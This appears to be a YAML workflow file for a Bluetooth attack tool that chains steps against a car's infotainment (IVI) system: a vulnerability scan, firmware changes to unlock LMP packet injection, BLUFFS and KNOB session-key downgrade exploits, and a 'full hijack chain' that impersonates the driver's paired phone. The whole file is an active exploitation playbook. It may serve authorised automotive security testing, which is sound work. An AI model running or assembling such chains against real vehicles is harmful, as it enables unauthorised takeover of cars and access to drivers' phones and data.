name: IVI Attack Chain
description: Full automotive IVI exploitation workflow
duration: ~30 minutes
risk: high (active exploitation)
requires:
  - DarkFirmware adapter
  - Phone MAC address (--phone)

steps:
  - command: vulnscan {target} -a {hci}
    description: Initial vulnerability scan

  - command: adapter firmware-set lmp-size 17
    description: Unlock full LMP PDU injection

  - command: exploit {target} bluffs --variant probe
    description: Test BLUFFS session key downgrade

  - command: exploit {target} knob
    description: Test KNOB key size reduction

  - command: exploit {target} hijack {phone}
    description: Full hijack chain (impersonate phone)

  - command: report -o ivi_attack_report.html
    description: Generate attack report
